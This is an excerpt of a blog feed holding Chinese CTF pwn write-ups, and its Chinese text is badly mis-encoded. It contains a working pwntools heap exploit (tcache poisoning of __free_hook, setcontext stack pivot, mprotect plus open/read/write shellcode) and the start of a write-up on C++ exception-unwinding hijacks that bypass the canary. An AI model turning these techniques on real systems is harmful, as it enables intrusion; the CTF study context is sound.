class="line">p.sendlineafter(<span class="string">b&#x27;Input your username:&#x27;</span>, <span class="string">b&#x27;4dm1n&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input your password:&#x27;</span>, <span class="string">b&#x27;985da4f8cb37zkj&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0-6 å¡«å…¥tcacheï¼Œ7è¿›unsorted,åŠ ä¸€ä¸ª8åˆ†å‰²</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    add(i,(<span class="number">0x290</span>),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x290</span>)</span><br><span class="line">    <span class="comment">#print(f&quot;alloc &#123;i&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">    <span class="comment">#print(f&quot;delete &#123;i&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">leak_addr=show(<span class="number">7</span>)<span class="comment"># deleteä¼šè¿˜åŸå†…å®¹ï¼Œè€Œæ³„éœ²ä¼šå†è¿‡ä¸€érc4</span></span><br><span class="line">leak_addr=cipher.decrypt(leak_addr)</span><br><span class="line">leak_addr=u64(leak_addr[:<span class="number">8</span>])</span><br><span class="line">main_arena_addr=leak_addr-<span class="number">96</span></span><br><span class="line">libc_base=main_arena_addr-<span class="number">0x3ebca0</span>+<span class="number">0x60</span></span><br><span class="line">libc.address=libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¯æ¬¡é‡æ–°åˆå§‹åŒ–ï¼Œè¿™æ˜¯ä¸ªæµå¯†ç ä¸ç„¶ä¼šç»§ç»­ï¼Œè‰</span></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">leak_addr=show(<span class="number">1</span>)</span><br><span class="line">leak_addr=cipher.decrypt(leak_addr)</span><br><span class="line"><span class="built_in">print</span>(leak_addr)</span><br><span class="line">leak_addr=u64(leak_addr[:<span class="number">8</span>])</span><br><span class="line">heap_base=leak_addr-<span class="number">0x1670</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] heap_base: <span class="subst">&#123;<span class="built_in">hex</span>(heap_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunks : $rebase(0x203080)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å§‹</span></span><br><span class="line">free_hook=libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="comment"># malloc_hook=libc_base + 0x3ebc30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] free_hook: &quot;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line">gadget=libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line"><span class="comment"># open_addr=libc.symbols[&#x27;open&#x27;]</span></span><br><span class="line"><span class="comment"># read_addr=libc.symbols[&#x27;read&#x27;]</span></span><br><span class="line"><span class="comment"># write_addr=libc.symbols[&#x27;write&#x27;]</span></span><br><span class="line"><span class="comment"># print(&quot;[+] orw: &quot;,hex(open_addr),hex(read_addr),hex(write_addr))</span></span><br><span class="line">mprotect=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>) <span class="comment"># æŠŠtcacheé‡Œå¼€å§‹çš„0x50æ‹¿å‡ºæ¥</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">payload1=p64(free_hook)</span><br><span class="line">payload1=cipher.encrypt(payload1)</span><br><span class="line">edit(<span class="number">9</span>,payload1)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>) <span class="comment"># ä¸‹ä¸€ä¸ªæ˜¯freehook</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_stack=heap_base+0x1670</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2164f</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x23a6a</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x1b96</span></span><br><span class="line">ret = libc_base + <span class="number">0x8aa</span></span><br><span class="line">buffer=heap_base+<span class="number">0x3000</span> <span class="comment"># éšä¾¿å†™çš„</span></span><br><span class="line">shellcode = (</span><br><span class="line">    shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">    + shellcraft.read(<span class="string">&quot;rax&quot;</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">    + shellcraft.write(<span class="number">1</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">)</span><br><span class="line">shellcode=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(ret)+p64(pop_rdi)+p64(heap_base)+p64(pop_rsi)+p64(<span class="number">0x7000</span>)+p64(pop_rdx)+p64(<span class="number">0x7</span>)+p64(mprotect)+p64(heap_base+<span class="number">0x1670</span>+<span class="number">0x58</span>)+asm(shellcode)</span><br><span class="line"><span class="comment"># fake_stack=b&#x27;\x00&#x27;*0x10</span></span><br><span class="line"><span class="comment"># fake_stack+=p64(pop_rdi)+p64(heap_base+0x24c8)+p64(pop_rsi)+p64(0)+p64(libc_base+0x10fbf0)</span></span><br><span class="line"><span class="comment"># fake_stack+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x40)+p64(libc_base+0x110020)</span></span><br><span class="line"><span class="comment"># fake_stack+=p64(pop_rdi)+p64(1)+p64(libc_base+0x1100f0)</span></span><br><span class="line"><span class="comment"># fake_stack+=b&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tmdæœ‰ç‚¹çœ‹è¿æ°”ï¼Œåœ°å€éšæœºé‡Œé¢æœ‰0aå°±gg</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b free&#x27;</span>)</span><br><span class="line"><span class="comment"># free1 å°†æ ˆè¿ç§»åˆ°0ä¸Š</span></span><br><span class="line"><span class="comment"># è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯è¿ç§»æ—¶å€™çš„æŒ‡ä»¤çŠ¶æ€</span></span><br><span class="line">payload2=<span class="string">b&#x27;z&#x27;</span>*<span class="number">0xa0</span>+p64(heap_base+<span class="number">0x1670</span>+<span class="number">0x10</span>)+p64(ret)</span><br><span class="line"><span class="comment"># è¯»åˆ°0xaä¼šæ–­ï¼Œæ‰€ä»¥freeæ‰è®©å®ƒå˜æ˜æ–‡ï¼Ÿï¼Ÿï¼Ÿ</span></span><br><span class="line"></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">edit(<span class="number">1</span>,payload2)<span class="comment">#è¿™ä¸ªèƒ½é€š</span></span><br><span class="line"></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">edit(<span class="number">0</span>,shellcode)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x40</span>,cipher.encrypt(p64(gadget))) </span><br><span class="line"><span class="comment">#free_hookå†™å…¥äº†gadgetï¼Œä¸‹æ¬¡freeä¼šå°†æ ˆè¿ç§»åˆ°freeçš„chunk+0xa0å†™çš„å†…å®¹</span></span><br><span class="line"><span class="comment"># åˆ°è¿™éƒ½æˆåŠŸäº†</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;é¢˜ç›®åˆ†æ&lt;/h1&gt;
&lt;p&gt;Glibc2.27ï¼Œ64ä½ä¿æŠ¤å…¨å¼€ï¼Œæ²™ç®±banæ‰äº†execveå’Œexecveatï¼Œæ‰“orwã€‚&lt;/p&gt;
&lt;h2 id=&quot;çˆ†ç ´ç”¨æˆ·åå’Œå¯†ç &quot;&gt;çˆ†ç ´ç”¨æˆ·åå’Œå¯†ç &lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªç¨‹åºä¸Šæ¥å…ˆåœ¨è¿œç¨‹æ‰“å¼€äº†ç”¨æˆ·åå’Œå¯†ç çš„æ–‡ä»¶è¦æˆ‘ä»¬è¾“å…¥ï¼Œæ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°é¢˜ç›®</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="heap" scheme="https://zjw1nd.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>CHOPâ€”â€”å¼ºç½‘æ¯2024expect_number wp</title>
    <link href="https://zjw1nd.github.io/2024/11/10/CHOP%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024expect-number-wp/"/>
    <id>https://zjw1nd.github.io/2024/11/10/CHOP%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024expect-number-wp/</id>
    <published>2024-11-10T15:27:20.000Z</published>
    <updated>2024-11-20T12:42:03.374Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å‚è€ƒè‡ª<a href="https://xz.aliyun.com/t/12967">æº¢å‡ºæ¼æ´åœ¨å¼‚å¸¸å¤„ç†ä¸­çš„æ”»å‡»åˆ©ç”¨æ‰‹æ³•-ä¸Š</a>å’Œ<a href="https://xz.aliyun.com/t/12994">æº¢å‡ºæ¼æ´åœ¨å¼‚å¸¸å¤„ç†ä¸­çš„æ”»å‡»åˆ©ç”¨æ‰‹æ³•-ä¸‹</a></p></blockquote><h1>ç®€å•äº†è§£ä¸‹C++å¼‚å¸¸å¤„ç†</h1><p>C++æœ‰è¿™æ ·çš„å…³é”®å­—ï¼Œæ”¯æŒæ‰§è¡Œå¼‚å¸¸çš„å¤„ç†ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="built_in">do_sth</span>();</span><br><span class="line">    <span class="keyword">throw</span> exception;</span><br><span class="line">    <span class="built_in">nothing_will_happen_here</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(exception typeA)&#123;</span><br><span class="line">    <span class="built_in">my_handler</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(exception typeB)&#123;</span><br><span class="line">    <span class="built_in">my_handler2</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³äºC++çš„å¼‚å¸¸å¤„ç†ï¼š</p><blockquote><p><a href="https://www.cnblogs.com/sgawscd/p/13870406.html">https://www.cnblogs.com/sgawscd/p/13870406.html</a><br><a href="https://blog.csdn.net/GrayOnDream/article/details/138469330">https://blog.csdn.net/GrayOnDream/article/details/138469330</a>  &lt;-- å…·ä½“çš„ç»†èŠ‚å‚è€ƒè¿™ä¸€ç¯‡å³å¯</p></blockquote><p>ç®€å•çš„æ¥è¯´ï¼Œä»»ä½•å‡½æ•°éƒ½å¯ä»¥é€šè¿‡throwå…³é”®å­—æŠ›å‡ºå¼‚å¸¸ã€‚å¯¹äºå¯èƒ½æŠ›å‡ºå¼‚å¸¸çš„ä»£ç ï¼Œè¦ç”¨tryå»åŒ…è£¹ã€‚è€Œåç»­éœ€è¦ç”¨catchå»æ•è·å¼‚å¸¸ã€‚<br>catchå¯ä»¥åœ¨åé¢æ·»åŠ ç±»å‹æ¥å£°æ˜catchå†…å¤„ç†çš„å¼‚å¸¸ç±»å‹ã€‚è§¦å‘throwåï¼Œåœ¨å¼€å‘è€…çš„è§†è§’ä¸‹ï¼Œä¼šä»æŠ›å‡ºå¼‚å¸¸çš„tryå—å‘å¤–åŒ¹é…ç¬¬ä¸€ä¸ªç±»å‹åˆé€‚çš„catchå—ï¼Œç„¶åç¨‹åºä¼šå°†æ§åˆ¶æƒç§»äº¤åˆ°catchå—ä¸­çš„å¼‚å¸¸å¤„ç†ä»£ç ã€‚æ­¤æ—¶throwåé¢çš„ä»£ç å…¨éƒ¨éƒ½ä¸ä¼šæ‰§è¡Œï¼Œå› æ­¤è¿™ç§æ§åˆ¶æµçš„å¼ºè¡Œè·³è½¬ç»™äº†æˆ‘ä»¬åˆ©ç”¨çš„æœºä¼šã€‚è¿™ç§å¯¹äºcatché€å±‚å‘ä¸Šçš„åŒ¹é…æœºåˆ¶ï¼Œå«åš<strong>æ ˆå±•å¼€(Stack Unwind)</strong>ã€‚</p><h2 id="libstdc-çš„å¼‚å¸¸å¤„ç†å®ç°">libstdc++çš„å¼‚å¸¸å¤„ç†å®ç°</h2><p>ä¸‹é¢ä»¥linuxçš„libstdc++çš„å®ç°ä¸ºä¾‹å¤§æ¦‚çœ‹ä¸€ä¸‹throwä¹‹åå‘ç”Ÿäº†ä»€ä¹ˆ</p><p>é¦–å…ˆï¼Œå½“ä½¿ç”¨throwå…³é”®å­—çš„æ—¶å€™ï¼Œç¼–è¯‘å™¨ä¼šå…ˆç”¨<code>__cxa_allocate_exception</code>åˆ†é…ä¸€äº›å¤„ç†æ‰€éœ€è¦çš„å¯¹è±¡ç©ºé—´ã€‚ç„¶åç¨‹åºä¼šè°ƒç”¨<code>__cxa_throw()</code>æŠ›å‡ºå¼‚å¸¸ï¼Œæœ€åæ ¸å¿ƒå‡½æ•°ä¼šè¿›å…¥<code>_Unwind_RaiseException()</code>ã€‚å†åé¢å°±æ˜¯gdbè·Ÿè¿›å›°éš¾çš„å†…å®¹äº†ï¼Œå…·ä½“ç»†èŠ‚ä¸å†èµ˜è¿°ã€‚ä¸è¿‡ä¼šç”¨Unwindä»¥åŠç¨‹åºä¸­<code>eh_frame</code>èŠ‚ä¸­ç›¸å…³çš„ä¿¡æ¯å»å¯¹å †æ ˆè¿›è¡Œå›æº¯ã€‚</p><p>æ—¢ç„¶ä¼šå›æº¯æ‰¾ä»£ç ï¼Œé‚£ä¹ˆä¸€å®šä¼šè®¾è®¡åˆ°å †æ ˆä¸­pcçš„æ¢å¤ï¼Œä¹Ÿå°±æ˜¯è¿”å›åœ°å€ã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿè¦†ç›–tryå—çš„è¿”å›åœ°å€ç„¶åå»throwï¼Œå°±å¯èƒ½èƒ½åŠ«æŒåˆ°æ§åˆ¶æµåˆ°å…¶ä»–çš„catchå—ï¼ˆä¸æ˜¯å…¶ä»–catchå—çš„è¯ï¼Œå›æº¯åˆ°mainå‘ç°æ²¡æœ‰catchä»£ç ï¼Œä¼šè¢«terminateé€€å‡ºï¼‰</p><p>å¦å¤–ï¼Œç”±äºthrowåé¢çš„å†…å®¹å…¶å®éƒ½æ ¹æœ¬ä¸ä¼šæ‰§è¡Œï¼Œæ‰€ä»¥è¿™ä¸ªæ“ä½œèƒ½å¤Ÿç»•è¿‡canaryï¼ˆcheckæ ¹æœ¬ä¸æ‰§è¡Œï¼Œè¦†ç›–äº†canaryä¹Ÿæ²¡äº‹ï¼‰ï¼Œè¿™æ˜¯æ¯”è¾ƒç¥å¥‡çš„ä¸€ç‚¹ã€‚</p><h1>å¯¹äºè¿™é“é¢˜ç›®</h1><h2 id="æµç¨‹åˆ†æ">æµç¨‹åˆ†æ</h2><p>è¿™ä¸€éƒ¨åˆ†æˆ‘ä»¬ä¸å¤šè®²ï¼Œç¨‹åºæ˜¯é€šè¿‡ä¸€ä¸ªä»¥1ä¸ºç§å­çš„ä¼ªéšæœºæ•°åºåˆ—ï¼Œç„¶åé€šè¿‡ç”¨æˆ·è¾“å…¥0 1 2è¿›è¡ŒåŠ ï¼Œä¹˜ï¼Œé™¤æ“ä½œã€‚ç¨‹åºæä¾›äº†ä¸€ä¸ª<br>system giftï¼ˆä½†æ˜¯æ²¡ç”¨ï¼‰ã€‚</p><p>æŒ‡é’ˆåˆå§‹åŒ–åœ¨initarrayï¼Œç¨‹åºæœ‰4ä¸ªç±»ï¼Œä¸€ä¸ªåŸºç±»å’Œ3ä¸ªæ´¾ç”Ÿï¼ˆçŒœæµ‹è¿™æ˜¯ä¸ºäº†è®©å®ƒä»¬å‡½æ•°è™šè¡¨çš„åœ°å€ç›¸é‚»ï¼‰ï¼Œå…¶ä¸­ä¸¤ä¸ªæ´¾ç”Ÿç±»ä¸€ä¸ªæ˜¯é€€å‡ºä¸€ä¸ªæ˜¯å­˜åœ¨æº¢å‡ºçš„æ¼æ´å‡½æ•°ã€‚5010-&gt;5520-&gt;vtable-&gt;func</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">data.rel.ro:<span class="number">0000000000004</span>C20 ; `vtable <span class="keyword">for</span><span class="number">&#x27;</span>Derived3</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C20 _ZTV8Derived3   dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C28                 dq offset _ZTI8Derived3 ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Derived3</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C30 off_4C30        dq offset display_d3    ; DATA XREF: set_d3_display+<span class="number">1</span>Câ†‘o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C38 ; `vtable <span class="keyword">for</span><span class="number">&#x27;</span>Derived2</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C38 _ZTV8Derived2   dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C40                 dq offset _ZTI8Derived2 ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Derived2</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C48 quit_ptr        dq offset quit          ; DATA XREF: set_quit+<span class="number">1</span>Câ†‘o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C50 ; `vtable <span class="keyword">for</span><span class="number">&#x27;</span>Derived</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C50 _ZTV7Derived    dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C58                 dq offset _ZTI7Derived  ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Derived</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C60 vuln_off        dq offset vuln          ; DATA XREF: init_game+<span class="number">1</span>Câ†‘o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C68 ; `vtable <span class="keyword">for</span><span class="number">&#x27;B</span>ase</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C68 _ZTV4Base       dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C70                 dq offset _ZTI4Base     ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;B</span>ase</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C78 base_display_ptr dq offset base_display ; DATA XREF: set_base_display_ptr+Câ†‘o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C80                 public _ZTISt13runtime_error ; weak</span><br></pre></td></tr></table></figure><p>5520æ­£å¥½åœ¨è¾“å…¥ç»“æ„çš„+288ä½ç½®ï¼Œé‡å¤288æ¬¡è¾“å…¥æ²¡æœ‰è€ƒè™‘ç»“æ„ä½“å¤´çš„12å­—èŠ‚ï¼Œå¯ä»¥æº¢å‡º12å­—èŠ‚ã€‚ä½†æ˜¯æ¯æ¬¡å†™å…¥ä¹‹åå‰ä¸€ä¸ªå°±ä¼šè¢«è¦†ç›–ä¸ºä¸Šæ¬¡æ“ä½œæˆ‘ä»¬å®é™…ä¸Šåªèƒ½æº¢å‡º1ä¸ªå­—èŠ‚ã€‚æ°å·§çš„æ˜¯ï¼Œ1ä¸ªå°±å¤Ÿäº†ï¼Œ50-&gt;60å³å¯æ€»ä¹‹æˆ‘ä»¬å°±åˆ©ç”¨ç¨‹åºçš„é€»è¾‘å’Œä¸€ä¸ªoffbyoneçš„æ¼æ´å°†æ­£å¸¸é€€å‡ºçš„æŒ‡é’ˆåŠ«æŒåˆ°äº†è™šè¡¨é‡Œå¦ä¸€ä¸ªæ´¾ç”Ÿç±»çš„æ¼æ´å‡½æ•°ä¸Šã€‚</p><p>æˆ‘ä»¬é‡ç‚¹å…³æ³¨è¿™ä¸ªæœ‰æ ˆæº¢å‡ºçš„åé—¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="built_in">std</span>::runtime_error *exception; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE buf[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;();</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL) &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    exception = (<span class="built_in">std</span>::runtime_error *)__cxa_allocate_exception(<span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="built_in">std</span>::runtime_error::runtime_error(exception, <span class="string">&quot;Input too long&quot;</span>);</span><br><span class="line">    __cxa_throw(exception,</span><br><span class="line">    (<span class="keyword">struct</span> type_info *)&amp;`typeinfo forstd`::runtime_error,</span><br><span class="line">    (<span class="type">void</span> (*)(<span class="type">void</span> *))&amp;<span class="built_in">std</span>::runtime_error::~runtime_error);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶ç¨‹åºé‡Œè¿˜æœ‰è¿™æ ·çš„catchå—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000024E1</span> ; __unwind &#123; <span class="comment">// __gxx_personality_v0</span></span><br><span class="line">.text:<span class="number">00000000000024E1</span>                 endbr64</span><br><span class="line">.text:<span class="number">00000000000024E5</span>                 push    rbp</span><br><span class="line">.text:<span class="number">00000000000024E6</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000000024E9</span>                 push    rbx</span><br><span class="line">.text:<span class="number">00000000000024</span>EA                 sub     rsp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000000024</span>EE                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000000024F</span>7                 mov     [rbp+var_18], rax</span><br><span class="line">.text:<span class="number">00000000000024F</span>B                 xor     eax, eax</span><br><span class="line">.text:<span class="number">00000000000024F</span>D                 mov     [rbp+var_24], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000002504</span>                 lea     rax, [rbp+var_24]</span><br><span class="line">.text:<span class="number">0000000000002508</span>                 mov     rsi, rax</span><br><span class="line">.text:<span class="number">000000000000250B</span>                 lea     rax, _ZSt3cin   ; <span class="built_in">std</span>::<span class="built_in">cin</span></span><br><span class="line">.text:<span class="number">0000000000002512</span>                 mov     rdi, rax</span><br><span class="line">.text:<span class="number">0000000000002515</span> ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000002515</span>                 call    __ZNSirsERi     ; <span class="built_in">std</span>::istream::operator&gt;&gt;(<span class="type">int</span> &amp;)</span><br><span class="line">.text:<span class="number">0000000000002515</span> ;   &#125; <span class="comment">// starts at 2515</span></span><br><span class="line">.text:<span class="number">000000000000251</span>A                 mov     eax, [rbp+var_24]</span><br><span class="line">.text:<span class="number">000000000000251</span>D                 jmp     <span class="type">short</span> loc_256A</span><br><span class="line">.text:<span class="number">000000000000251F</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000000251F</span> ;   catch(<span class="built_in">std</span>::runtime_error) <span class="comment">// owned by 2515</span></span><br><span class="line">.text:<span class="number">000000000000251F</span>                 endbr64</span><br><span class="line">.text:<span class="number">0000000000002523</span>                 cmp     rdx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000002527</span>                 jz      <span class="type">short</span> loc_2531</span><br><span class="line">.text:<span class="number">0000000000002529</span>                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">000000000000252</span>C                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">0000000000002531</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000002531</span></span><br><span class="line">.text:<span class="number">0000000000002531</span> loc_2531:                               ; CODE XREF: <span class="built_in">cin</span>+<span class="number">46</span>â†‘j</span><br><span class="line">.text:<span class="number">0000000000002531</span>                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000002534</span>                 call    ___cxa_begin_catch</span><br><span class="line">.text:<span class="number">0000000000002539</span>                 mov     [rbp+var_20], rax</span><br><span class="line">.text:<span class="number">000000000000253</span>D                 lea     rax, command    ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">0000000000002544</span>                 mov     rdi, rax        ; command</span><br><span class="line">.text:<span class="number">0000000000002547</span> ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000002547</span>                 call    _system  ; ------&gt; system</span><br><span class="line">.text:<span class="number">0000000000002547</span> ;   &#125; <span class="comment">// starts at 2547</span></span><br><span class="line">.text:<span class="number">000000000000254</span>C                 call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">0000000000002551</span>                 jmp     <span class="type">short</span> loc_256A</span><br><span class="line">.text:<span class="number">0000000000002553</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000002553</span> ;   cleanup() <span class="comment">// owned by 2547</span></span><br><span class="line">.text:<span class="number">0000000000002553</span>                 endbr64</span><br><span class="line">.text:<span 